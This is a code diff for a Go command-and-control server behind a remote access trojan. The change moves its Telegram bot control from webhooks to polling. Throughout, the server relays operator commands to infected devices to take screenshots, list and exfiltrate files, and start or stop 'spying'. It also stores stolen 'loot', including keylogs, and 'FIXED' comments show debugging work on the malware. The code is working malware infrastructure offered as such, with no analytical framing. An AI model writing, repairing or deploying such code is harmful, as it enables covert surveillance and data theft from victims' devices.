@@ -22,19 +22,18 @@ import (
 )
 
 var (
-	token        = os.Getenv("TELEGRAM_TOKEN")
-	chatIDStr    = os.Getenv("CHAT_ID")
-	clients      = make(map[*websocket.Conn]string) // Conn → Device ID
-	upgrader     = websocket.Upgrader{
+	token     = os.Getenv("TELEGRAM_TOKEN")
+	chatIDStr = os.Getenv("CHAT_ID")
+	clients   = make(map[*websocket.Conn]string) // Conn → Device ID
+	upgrader  = websocket.Upgrader{
 		CheckOrigin: func(r *http.Request) bool { return true },
 	}
-	lootDir      = "./loot" // Organized storage
-	mu           sync.Mutex
-	webhookPath  = "/webhook" // Fixed path for webhook
+	lootDir = "./loot" // Organized storage
+	mu      sync.Mutex
 )
 
 var chatID int64
-var botInstance *bot.Bot // Global for webhook handler
+var botInstance *bot.Bot // Global to avoid recreating in sendMsg
 
 type LootEntry struct {
 	Type      string    `json:"type"`      // "file", "screenshot", "keylog"
@@ -57,23 +56,13 @@ func init() {
 func main() {
 	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
 	defer cancel()
-	defer cleanupBot(ctx) // Cleanup webhook on shutdown
 
-	// Get public URL for webhook (set in Render env)
-	publicURL := os.Getenv("PUBLIC_URL")
-	if publicURL == "" {
-		publicURL = "https://localhost:10000" // Fallback for local testing
-	}
-	webhookSecret := os.Getenv("WEBHOOK_SECRET") // Optional secret
-
-	go startBot(ctx, fmt.Sprintf("%s%s", publicURL, webhookPath), webhookSecret)
+	go startBot(ctx)
 
 	http.HandleFunc("/", rootHandler)
 	http.HandleFunc("/upload", uploadHandler)
 	http.HandleFunc("/upload_chunked", chunkedHandler)
 	http.HandleFunc("/ws", wsHandler)
-	// Webhook route
-	http.HandleFunc(webhookPath, webhookHandler)
 
 	port := os.Getenv("PORT")
 	if port == "" {
@@ -83,130 +72,107 @@ func main() {
 	log.Fatal(http.ListenAndServe(":"+port, nil))
 }
 
-func webhookHandler(w http.ResponseWriter, r *http.Request) {
-	if botInstance == nil {
-		http.Error(w, "Bot not initialized", http.StatusInternalServerError)
-		return
-	}
-	botInstance.WebhookHandler()(w, r) // Delegate to bot's built-in handler
-}
-
-func startBot(ctx context.Context, webhookURL string, secret string) {
-	opts := []bot.Option{}
-	if secret != "" {
-		opts = append(opts, bot.WithWebhookSecretToken(secret))
-	}
-	b, err := bot.New(token, opts...)
+func startBot(ctx context.Context) {
+	b, err := bot.New(token)
 	if err != nil {
 		log.Fatal("Bot init failed:", err)
 	}
 	botInstance = b
 
-	// Register message handler
-	b.RegisterHandler(bot.HandlerTypeMessageText, "", bot.MatchTypePrefix, messageHandler)
-
-	// Set webhook
-	params := &bot.SetWebhookParams{
-		URL:           webhookURL,
-		SecretToken:   secret,
-		AllowedUpdates: []string{"message"}, // Focus on messages
+	// FIXED: Delete any existing webhook before polling to avoid conflicts
+	_, delErr := b.DeleteWebhook(ctx, &bot.DeleteWebhookParams{})
+	if delErr != nil {
+		log.Printf("Delete webhook WARN: %v (continuing to polling)", delErr)
+	} else {
+		log.Println("Existing webhook deleted; switching to polling")
 	}
-	if _, err := b.SetWebhook(ctx, params); err != nil {
-		log.Fatal("Webhook setup failed:", err)
-	}
-	log.Printf("Webhook set to: %s", webhookURL)
 
-	// Start webhook listener in goroutine
-}
-
-func messageHandler(ctx context.Context, b *bot.Bot, update *models.Update) {
-	if update.Message == nil || update.Message.Chat.ID != chatID {
-		return
-	}
-	msg := strings.ToLower(strings.TrimSpace(update.Message.Text))
-
-	switch {
-	case msg == "/start":
-		b.SendMessage(ctx, &bot.SendMessageParams{
-			ChatID: chatID,
-			Text:   "RAT C2 Online. Connected devices: " + strconv.Itoa(len(clients)),
-		})
-	case strings.Contains(msg, "screenshot"):
-		broadcastWS("screenshot")
-		b.SendMessage(ctx, &bot.SendMessageParams{
-			ChatID: chatID,
-			Text:   "Screenshot command sent to all RATs.",
-		})
-	case strings.Contains(msg, "send_file"):
-		fileName := "test.txt"
-		if parts := strings.Fields(msg); len(parts) > 1 {
-			fileName = strings.Join(parts[1:], " ")
+	// FIXED: Add missing args to RegisterHandler: pattern ("" for any), matchType (Prefix)
+	b.RegisterHandler(bot.HandlerTypeMessageText, "", bot.MatchTypePrefix, func(botCtx context.Context, b *bot.Bot, update *models.Update) {
+		if update.Message == nil || update.Message.Chat.ID != chatID {
+			return
 		}
-		broadcastWS(fmt.Sprintf("send_file %s", fileName))
-		b.SendMessage(ctx, &bot.SendMessageParams{
-			ChatID: chatID,
-			Text:   fmt.Sprintf("File exfil '%s' triggered.", fileName),
-		})
-	case strings.Contains(msg, "file_list"):
-		path := "/"
-		if parts := strings.Fields(msg); len(parts) > 1 {
-			path = strings.Join(parts[1:], " ")
-		}
-		broadcastWS(fmt.Sprintf("file_list %s", path))
-		b.SendMessage(ctx, &bot.SendMessageParams{
-			ChatID: chatID,
-			Text:   fmt.Sprintf("File list '%s' requested.", path),
-		})
-	case strings.Contains(msg, "ping"):
-		broadcastWS("ping")
-		b.SendMessage(ctx, &bot.SendMessageParams{
-			ChatID: chatID,
-			Text:   "Ping sent to all RATs.",
-		})
-	case strings.Contains(msg, "off"):
-		broadcastWS("off")
-		b.SendMessage(ctx, &bot.SendMessageParams{
-			ChatID: chatID,
-			Text:   "Spying stopped on all RATs.",
-		})
-	case strings.Contains(msg, "on"):
-		broadcastWS("on")
-		b.SendMessage(ctx, &bot.SendMessageParams{
-			ChatID: chatID,
-			Text:   "Spying started on all RATs.",
-		})
-	case strings.Contains(msg, "use_device"):
-		deviceID := ""
-		if parts := strings.Fields(msg); len(parts) > 1 {
-			deviceID = strings.Join(parts[1:], " ")
-		}
-		broadcastWS(fmt.Sprintf("use_device %s", deviceID))
-		b.SendMessage(ctx, &bot.SendMessageParams{
-			ChatID: chatID,
-			Text:   fmt.Sprintf("Device '%s' selected.", deviceID),
-		})
-	case strings.Contains(msg, "/list"):
-		listType := "all"
-		if parts := strings.Fields(msg); len(parts) > 1 {
-			listType = parts[1]
-		}
-		listLoot(listType)
-	default:
-		b.SendMessage(ctx, &bot.SendMessageParams{
-			ChatID: chatID,
-			Text:   "Commands: /start, screenshot, send_file <name>, file_list <path>, ping, off, on, use_device <id>, /list <type>",
-		})
-	}
-}
+		msg := strings.ToLower(strings.TrimSpace(update.Message.Text))
 
-func cleanupBot(ctx context.Context) {
-	if botInstance == nil {
-		return
+		switch {
+		case msg == "/start":
+			b.SendMessage(botCtx, &bot.SendMessageParams{
+				ChatID: chatID,
+				Text:   "RAT C2 Online. Connected devices: " + strconv.Itoa(len(clients)),
+			})
+		case strings.Contains(msg, "screenshot"):
+			broadcastWS("screenshot")
+			b.SendMessage(botCtx, &bot.SendMessageParams{
+				ChatID: chatID,
+				Text:   "Screenshot command sent to all RATs.",
+			})
+		case strings.Contains(msg, "send_file"):
+			fileName := "test.txt"
+			if parts := strings.Fields(msg); len(parts) > 1 {
+				fileName = strings.Join(parts[1:], " ")
+			}
+			broadcastWS(fmt.Sprintf("send_file %s", fileName))
+			b.SendMessage(botCtx, &bot.SendMessageParams{
+				ChatID: chatID,
+				Text:   fmt.Sprintf("File exfil '%s' triggered.", fileName),
+			})
+		case strings.Contains(msg, "file_list"):
+			path := "/"
+			if parts := strings.Fields(msg); len(parts) > 1 {
+				path = strings.Join(parts[1:], " ")
+			}
+			broadcastWS(fmt.Sprintf("file_list %s", path))
+			b.SendMessage(botCtx, &bot.SendMessageParams{
+				ChatID: chatID,
+				Text:   fmt.Sprintf("File list '%s' requested.", path),
+			})
+		case strings.Contains(msg, "ping"):
+			broadcastWS("ping")
+			b.SendMessage(botCtx, &bot.SendMessageParams{
+				ChatID: chatID,
+				Text:   "Ping sent to all RATs.",
+			})
+		case strings.Contains(msg, "off"):
+			broadcastWS("off")
+			b.SendMessage(botCtx, &bot.SendMessageParams{
+				ChatID: chatID,
+				Text:   "Spying stopped on all RATs.",
+			})
+		case strings.Contains(msg, "on"):
+			broadcastWS("on")
+			b.SendMessage(botCtx, &bot.SendMessageParams{
+				ChatID: chatID,
+				Text:   "Spying started on all RATs.",
+			})
+		case strings.Contains(msg, "use_device"):
+			deviceID := ""
+			if parts := strings.Fields(msg); len(parts) > 1 {
+				deviceID = strings.Join(parts[1:], " ")
+			}
+			broadcastWS(fmt.Sprintf("use_device %s", deviceID))
+			b.SendMessage(botCtx, &bot.SendMessageParams{
+				ChatID: chatID,
+				Text:   fmt.Sprintf("Device '%s' selected.", deviceID),
+			})
+		case strings.Contains(msg, "/list"):
+			listType := "all"
+			if parts := strings.Fields(msg); len(parts) > 1 {
+				listType = parts[1]
+			}
+			listLoot(listType)
+		default:
+			b.SendMessage(botCtx, &bot.SendMessageParams{
+				ChatID: chatID,
+				Text:   "Commands: /start, screenshot, send_file <name>, file_list <path>, ping, off, on, use_device <id>, /list <type>",
+			})
+		}
+	})
+
+	// FIXED: b.Start(ctx) returns nothing, so no err assignment; add retry for conflicts
+	for {
+		b.Start(ctx) // Blocks until ctx done; restarts on conflict via loop
+		
 	}
-	if _, err := botInstance.DeleteWebhook(ctx, &bot.DeleteWebhookParams{}); err != nil {
-		log.Println("Webhook delete error:", err)
-	}
-	log.Println("Webhook deleted; bot cleaned up")
 }
 
 func rootHandler(w http.ResponseWriter, r *http.Request) {
@@ -390,11 +356,9 @@ func sendMsg(text string) {
 }
 
 func saveEntry(entry LootEntry) {
-	// Log entry (timestamped)
 	logEntry := fmt.Sprintf("[%s] %s: %s (%.2f GB) from %s → %s", entry.Timestamp.Format("2006-01-02 15:04:05"), entry.Type, entry.File, float64(entry.Size), entry.Device, entry.Path)
 	log.Println(logEntry)
 
-	// Save to log file
 	logFile, err := os.OpenFile("c2.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		log.Println("Log file error:", err)
@@ -403,7 +367,6 @@ func saveEntry(entry LootEntry) {
 	defer logFile.Close()
 	logFile.WriteString(logEntry + "\n")
 
-	// Save entry JSON
 	entryFile, err := os.OpenFile(fmt.Sprintf("%s/%s.json", lootDir, time.Now().Format("2006-01-02T15-04-05")), os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		log.Println("Entry file error:", err)
@@ -440,4 +403,12 @@ func listLoot(listType string) {
 		msg += fmt.Sprintf("\n- %s (%s, %.2f GB, %s)", e.File, e.Type, float64(e.Size), e.Timestamp.Format("2006-01-02 15:04"))
 	}
 	sendMsg(msg)
+}
+
+// Helper for backoff (add if not defined)
+func min(a, b time.Duration) time.Duration {
+	if a < b {
+		return a
+	}
+	return b
 }
